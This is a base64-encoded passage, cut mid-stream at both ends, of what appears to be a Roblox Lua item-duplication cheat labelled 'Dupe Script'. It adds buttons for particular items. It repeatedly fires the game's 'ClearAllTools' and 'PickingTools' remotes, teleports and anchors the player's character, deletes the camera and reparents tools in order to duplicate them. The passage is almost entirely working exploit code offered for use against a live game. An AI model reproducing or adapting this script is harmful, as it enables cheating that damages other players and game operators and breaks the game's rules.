MC44NTkyMjUwOTQsIC0wLjA1OTE0NTA2MzIsIC0wLjg1NzIyMDE3MywgLTAuNTExNTQyMjYxLCAtMC45OTcyODExMzQsIDAuMDczMzA0MjgwNiwgLTAuMDA3NTMzNDMxMDUpCiAgICAgICAgbG9jYWwgdmFyX2tkdTlqNSA9IHsKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMCwgMCksIFZlY3RvcjMubmV3KDAsIDAuNSwgMCksIFZlY3RvcjMubmV3KDAsIDEsIDApLCBWZWN0b3IzLm5ldygwLCAxLjUsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAyLCAwKSwgVmVjdG9yMy5uZXcoMCwgMi41LCAwKSwgVmVjdG9yMy5uZXcoMCwgMywgMCksIFZlY3RvcjMubmV3KDAsIDMuNSwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDQsIDApLCBWZWN0b3IzLm5ldygwLCA0LjUsIDApLCBWZWN0b3IzLm5ldygwLCA1LCAwKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTEpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtMiksIFZlY3RvcjMubmV3KDAsIDUsIC0zKSwgVmVjdG9yMy5uZXcoMCwgNSwgLTQpLCBWZWN0b3IzLm5ldygwLCA1LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC02KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTcpLCBWZWN0b3IzLm5ldygwLCA1LCAtOCksIFZlY3RvcjMubmV3KDAsIDUsIC05KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNS41LCAtMTApLCBWZWN0b3IzLm5ldygwLCA2LCAtMTApLCBWZWN0b3IzLm5ldygwLCA2LjUsIC0xMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDcsIC0xMCksIFZlY3RvcjMubmV3KDAsIDcuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgOCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgOC41LCAtMTApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA5LCAtMTApLCBWZWN0b3IzLm5ldygwLCA5LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDEwLCAtMTApLCBWZWN0b3IzLm5ldygwLCAxMCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTQuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtNCksIFZlY3RvcjMubmV3KDAsIDEwLCAtMy41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0zKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC0yLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTIpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTEuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtMC41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIDApLCBWZWN0b3IzLm5ldygwLCA5LCAtNSksIFZlY3RvcjMubmV3KDAsIDgsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNywgLTUpLCBWZWN0b3IzLm5ldygwLCA2LCAtNSksIFZlY3RvcjMubmV3KDAsIDUsIC01KSwgVmVjdG9yMy5uZXcoMCwgNCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAzLCAtNSksIFZlY3RvcjMubmV3KDAsIDIsIC01KSwgVmVjdG9yMy5uZXcoMCwgMSwgLTUpLCBWZWN0b3IzLm5ldygwLCAwLCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIC0xMCksIFZlY3RvcjMubmV3KDAsIDAsIC05KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTgpLCBWZWN0b3IzLm5ldygwLCAwLCAtNyksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIC02KQogICAgICAgIH0KICAgICAgICBmb3IgXywgcG9zIGluIGlwYWlycyhncmlwUG9zaXRpb25zKSBkbwogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLkdyaXAgPSBncmlwQmFzZSArIHBvcwogICAgICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQmFja3BhY2tbdG9vbHNdLk5hbWUgPSBuYW1ldG9vbHMKICAgICAgICBlbmQKICAgICAgICBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lID0gb2xkY2ZyYW1lCiAgICAgICAgd2FpdCgwLjUpCiAgICAgICAgZm9yIF8sIHRvb2wgaW4gaXBhaXJzKGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkdldENoaWxkcmVuKCkpIGRvCiAgICAgICAgICAgIGlmIHRvb2w6SXNBKCJUb29sIikgYW5kIHRvb2wuTmFtZSA9PSBuYW1ldG9vbHMgdGhlbgogICAgICAgICAgICAgICAgdG9vbC5QYXJlbnQgPSBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICBlbmQKfSkKCi0tIEJ1dHRvbiBmb3IgQ3J5c3RhbCBDcm9zcwpUb29sc1RhYjpBZGRCdXR0b24oewogICAgTmFtZSA9ICJDcnlzdGFsIENyb3NzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl91MG1tN2QgPSAiY3J5c3RhbCBjcm9zcyBsZWwiCiAgICAgICAgbG9jYWwgdmFyX2xzaDYxMSA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5DRnJhbWUKICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlN0YXJ0ZXJHdWkiKTpTZXRDb3JlKCJTZW5kTm90aWZpY2F0aW9uIiwgewogICAgICAgICAgICBUaXRsZSA9ICJEdXBlIFNjcmlwdCIsCiAgICAgICAgICAgIFRleHQgPSAiUGxlYXNlIGRvIG5vdCBlcXVpcCBhbnkgdG9vbHMgb3IgdW5lcXVpcCB0b29scyBvciBjbGljayB0b29scyBvbiBpbnZlbnRvcnkuIEl0IHdpbGwgYnJlYWsgdGhlIHNjcmlwdC4iLAogICAgICAgICAgICBCdXR0b24xID0gIkkgdW5kZXJzdGFuZCIsCiAgICAgICAgICAgIER1cmF0aW9uID0gNQogICAgICAgIH0pCiAgICAgICAgbG9jYWwgdmFyXzlxbjlzbyA9ICJDcnlzdGFsIgogICAgICAgIGxvY2FsIHZhcl8zMTBmeGQgPSAiQ3J5c3RhbCIKICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4xKQogICAgICAgIGxvY2FsIHZhcl9xenpydGkgPSB7CiAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgIH0KICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBmb3IgbSA9IDEsIDIgZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIHdhaXQoMC4zKQogICAgICAgIGxvY2FsIHZhcl9nYTZpbWQgPSB0cnVlCiAgICAgICAgZm9yIG0gPSAxLCA1NyBkbwogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCB2YXJfZ3I4YTJoID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSOJuZGzqIgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIHZhcl83Ym5jODkgPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCB2YXJfN3Bzb2Z3ID0gQ0ZyYW1lLm5ldygtMC4yOTAwODY3NDYsIDAuMDc1NTgxMDczOCwgLTAuMDEwOTg3MjgxOCwgMC4wNDM5NTYwNDEzLCAwLjUwOTcwNTkwMSwgLTAuODU5MjI1MDk0LCAtMC4wNTkxNDUwNjMyLCAtMC44NTcyMjAxNzMsIC0wLjUxMTU0MjI2MSwgLTAuOTk3MjgxMTM0LCAwLjA3MzMwNDI4MDYsIC0wLjAwNzUzMzQzMTA1KQogICAgICAgIGxvY2FsIHZhcl83ZzhvZGogPSB7CiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDAsIDApLCBWZWN0b3IzLm5ldygwLCAwLjUsIDApLCBWZWN0b3IzLm5ldygwLCAxLCAwKSwgVmVjdG9yMy5uZXcoMCwgMS41LCAwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMiwgMCksIFZlY3RvcjMubmV3KDAsIDIuNSwgMCksIFZlY3RvcjMubmV3KDAsIDMsIDApLCBWZWN0b3IzLm5ldygwLCAzLjUsIDApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA0LCAwKSwgVmVjdG9yMy5uZXcoMCwgNC41LCAwKSwgVmVjdG9yMy5uZXcoMCwgNSwgMCksIFZlY3RvcjMubmV3KDAsIDUsIC0xKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgNSwgLTIpLCBWZWN0b3IzLm5ldygwLCA1LCAtMyksIFZlY3RvcjMubmV3KDAsIDUsIC00KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA1LCAtNiksIFZlY3RvcjMubmV3KDAsIDUsIC03KSwgVmVjdG9yMy5uZXcoMCwgNSwgLTgpLCBWZWN0b3IzLm5ldygwLCA1LCAtOSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDUuNSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNiwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgNi41LCAtMTApLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCA3LCAtMTApLCBWZWN0b3IzLm5ldygwLCA3LjUsIC0xMCksIFZlY3RvcjMubmV3KDAsIDgsIC0xMCksIFZlY3RvcjMubmV3KDAsIDguNSwgLTEwKSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgOSwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgOS41LCAtMTApLCBWZWN0b3IzLm5ldygwLCAxMCwgLTEwKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMTAsIC00LjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTQpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTMuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAtMyksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDEwLCAtMi41KSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0yKSwgVmVjdG9yMy5uZXcoMCwgMTAsIC0xLjUpLCBWZWN0b3IzLm5ldygwLCAxMCwgLTEpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAxMCwgLTAuNSksIFZlY3RvcjMubmV3KDAsIDEwLCAwKSwgVmVjdG9yMy5uZXcoMCwgOSwgLTUpLCBWZWN0b3IzLm5ldygwLCA4LCAtNSksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIDcsIC01KSwgVmVjdG9yMy5uZXcoMCwgNiwgLTUpLCBWZWN0b3IzLm5ldygwLCA1LCAtNSksIFZlY3RvcjMubmV3KDAsIDQsIC01KSwKICAgICAgICAgICAgVmVjdG9yMy5uZXcoMCwgMywgLTUpLCBWZWN0b3IzLm5ldygwLCAyLCAtNSksIFZlY3RvcjMubmV3KDAsIDEsIC01KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTUpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAtMTApLCBWZWN0b3IzLm5ldygwLCAwLCAtOSksIFZlY3RvcjMubmV3KDAsIDAsIC04KSwgVmVjdG9yMy5uZXcoMCwgMCwgLTcpLAogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAwLCAtNikKICAgICAgICB9CiAgICAgICAgZm9yIF8sIHBvcyBpbiBpcGFpcnMoZ3JpcFBvc2l0aW9ucykgZG8KICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5HcmlwID0gZ3JpcEJhc2UgKyBwb3MKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrW3Rvb2xzXS5OYW1lID0gbmFtZXRvb2xzCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IG9sZGNmcmFtZQogICAgICAgIHdhaXQoMC41KQogICAgICAgIGZvciBfLCB0b29sIGluIGlwYWlycyhnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5CYWNrcGFjazpHZXRDaGlsZHJlbigpKSBkbwogICAgICAgICAgICBpZiB0b29sOklzQSgiVG9vbCIpIGFuZCB0b29sLk5hbWUgPT0gbmFtZXRvb2xzIHRoZW4KICAgICAgICAgICAgICAgIHRvb2wuUGFyZW50ID0gZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyCiAgICAgICAgICAgIGVuZAogICAgICAgIGVuZAogICAgZW5kCn0pCgotLSBCdXR0b24gZm9yIEZpcmVYIENyb3NzClRvb2xzVGFiOkFkZEJ1dHRvbih7CiAgICBOYW1lID0gIkZpcmVYIENyb3NzIiwKICAgIENhbGxiYWNrID0gZnVuY3Rpb24oKQogICAgICAgIGxvY2FsIHZhcl9iczFudmUgPSAiY3Jvc3MgZmlyZXggbGVsIgogICAgICAgIGxvY2FsIHZhcl9paGFlZ2UgPSBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkUm9vdFBhcnQuQ0ZyYW1lCiAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJTdGFydGVyR3VpIik6U2V0Q29yZSgiU2VuZE5vdGlmaWNhdGlvbiIsIHsKICAgICAgICAgICAgVGl0bGUgPSAiRHVwZSBTY3JpcHQiLAogICAgICAgICAgICBUZXh0ID0gIlBsZWFzZSBkbyBub3QgZXF1aXAgYW55IHRvb2xzIG9yIHVuZXF1aXAgdG9vbHMgb3IgY2xpY2sgdG9vbHMgb24gaW52ZW50b3J5LiBJdCB3aWxsIGJyZWFrIHRoZSBzY3JpcHQuIiwKICAgICAgICAgICAgQnV0dG9uMSA9ICJJIHVuZGVyc3RhbmQiLAogICAgICAgICAgICBEdXJhdGlvbiA9IDUKICAgICAgICB9KQogICAgICAgIGxvY2FsIHZhcl9xeXlsYmYgPSAiRmlyZVgiCiAgICAgICAgbG9jYWwgdmFyX3I1ZHl3byA9ICJGaXJlWCIKICAgICAgICBpZiBnYW1lLlBsYXllcnMuTG9jYWxQbGF5ZXIuQ2hhcmFjdGVyLkh1bWFub2lkLlNpdCA9PSB0cnVlIHRoZW4KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZC5TaXQgPSBmYWxzZQogICAgICAgIGVuZAogICAgICAgIHdhaXQoMC4xKQogICAgICAgIGxvY2FsIHZhcl95bXZnZWYgPSB7CiAgICAgICAgICAgIFsxXSA9ICJDbGVhckFsbFRvb2xzIgogICAgICAgIH0KICAgICAgICBjbGVhcnRvb2xyZW1vdGU6RmlyZVNlcnZlcih1bnBhY2soYXJncykpCiAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKTpEZXN0cm95KCkKICAgICAgICBlbmQKICAgICAgICBmb3IgbSA9IDEsIDIgZG8KICAgICAgICAgICAgdGFzay53YWl0KCkKICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkNGcmFtZSA9IENGcmFtZS5uZXcoOTk5OTk5OTk5LjQxNCwgLTQ5MCwgOTk5OTk5OTk5LjQxNCwgMC45NzQzNjA0MDYsIC0wLjE3NTczNDA4OCwgMC4xNDA0OTc2MSwgLTAuMTMzNDQxNDA0LCAwLjA1MTQwNTMwNjksIDAuOTg5NzIyNzI5LCAtMC4xODExNTAzMDIsIC0wLjk4MzA5NDY5MiwgMC4wMjY2MzcwOTIyKQogICAgICAgIGVuZAogICAgICAgIHRhc2sud2FpdCgwLjIpCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gdHJ1ZQogICAgICAgIHdhaXQoMC4zKQogICAgICAgIGxvY2FsIHZhcl83MGoyZDggPSB0cnVlCiAgICAgICAgZm9yIG0gPSAxLCA3MSBkbwogICAgICAgICAgICBpZiBkdXBpbmcgPT0gZmFsc2UgdGhlbgogICAgICAgICAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICAgICAgICAgIHJldHVybgogICAgICAgICAgICBlbmQKICAgICAgICAgICAgaWYgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIikgdGhlbgogICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgIGVuZAogICAgICAgICAgICBsb2NhbCB2YXJfNHBlYnluID0gewogICAgICAgICAgICAgICAgWzFdID0gIlBpY2tpbmdUb29scyIsCiAgICAgICAgICAgICAgICBbMl0gPSB0b29sdGhhdGl3YW50dG9kdXBlCiAgICAgICAgICAgIH0KICAgICAgICAgICAgcGlja3Rvb2xyZW1vdGU6SW52b2tlU2VydmVyKHVucGFjayhhcmdzKSkKICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJQbGF5ZXJzIikuTG9jYWxQbGF5ZXIuQmFja3BhY2s6V2FpdEZvckNoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgaWYgZHVwaW5nID09IGZhbHNlIHRoZW4KICAgICAgICAgICAgICAgIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIuSHVtYW5vaWRSb290UGFydC5BbmNob3JlZCA9IGZhbHNlCiAgICAgICAgICAgICAgICByZXR1cm4KICAgICAgICAgICAgZW5kCiAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXJbdG9vbHRoYXRpd2FudHRvZHVwZV06RmluZEZpcnN0Q2hpbGQoIkhhbmRsZSIpLk5hbWUgPSAiSOJuZGzqIgogICAgICAgICAgICBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkuUGFyZW50ID0gZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkJhY2twYWNrCiAgICAgICAgICAgIGdhbWU6R2V0U2VydmljZSgiUGxheWVycyIpLkxvY2FsUGxheWVyLkJhY2twYWNrOkZpbmRGaXJzdENoaWxkKHRvb2x0aGF0aXdhbnR0b2R1cGUpLlBhcmVudCA9IGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXIKICAgICAgICAgICAgcmVwZWF0CiAgICAgICAgICAgICAgICBpZiBnYW1lOkdldFNlcnZpY2UoIldvcmtzcGFjZSIpOkZpbmRGaXJzdENoaWxkKCJDYW1lcmEiKSB0aGVuCiAgICAgICAgICAgICAgICAgICAgZ2FtZTpHZXRTZXJ2aWNlKCJXb3Jrc3BhY2UiKTpGaW5kRmlyc3RDaGlsZCgiQ2FtZXJhIik6RGVzdHJveSgpCiAgICAgICAgICAgICAgICBlbmQKICAgICAgICAgICAgICAgIHdhaXQoKQogICAgICAgICAgICB1bnRpbCBnYW1lOkdldFNlcnZpY2UoIlBsYXllcnMiKS5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQodG9vbHRoYXRpd2FudHRvZHVwZSkgPT0gbmlsCiAgICAgICAgZW5kCiAgICAgICAgZ2FtZS5QbGF5ZXJzLkxvY2FsUGxheWVyLkNoYXJhY3Rlci5IdW1hbm9pZFJvb3RQYXJ0LkFuY2hvcmVkID0gZmFsc2UKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKSA9PSBuaWwKICAgICAgICByZXBlYXQgd2FpdCgpIHVudGlsIGdhbWUuUGxheWVycy5Mb2NhbFBsYXllci5DaGFyYWN0ZXI6RmluZEZpcnN0Q2hpbGQoIkh1bWFub2lkUm9vdFBhcnQiKQogICAgICAgIGxvY2FsIHZhcl9sY2hyOG0gPSB0cnVlCiAgICAgICAgZHVwaW5nID0gZmFsc2UKICAgICAgICB3YWl0KCkKICAgICAgICBsb2NhbCB2YXJfamt1cXI5ID0gQ0ZyYW1lLm5ldygwLjA1MzgzMzM0NjgsIC0wLjI2NDgxMjQ2OSwgLTAuMDE3NzU5NDI5MywgMC45OTk5OTg2MjksIDAsIDAuMDAxNjQwMTE4MDgsIDAsIDEsIDAsIC0wLjAwMTY0MDExODA4LCAwLCAwLjk5OTk5ODYyOSkKICAgICAgICBsb2NhbCB2YXJfamZjem10ID0gewogICAgICAgICAgICBWZWN0b3IzLm5ldygwLCAtMiwgMCksIFZlY3RvcjMubmV3KDAsIC00LCAwKSwgVmVjdG9yMy5uZXcoMCwgLTYsIDApLCBWZWN0b3IzLm5ldygwLCAtOCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDAsIC0xMCwgMCksIFZlY3RvcjMubmV3KDAsIC0xMiwgMCksIFZlY3RvcjMubmV3KDAsIC0xNCwgMCksIFZlY3RvcjMubmV3KDEsIC0xNCwgMCksCiAgICAgICAgICAgIFZlY3RvcjMubmV3KDIsIC0xNCwgMCksIFZlY3RvcjMubmV3KDMsIC0xNCwgMCksIFZlY3RvcjMubmV3KDQsIC0xNCwgMCksIFZlY3RvcjMubmV3KDUsIC0xNCwgMCksCiAgI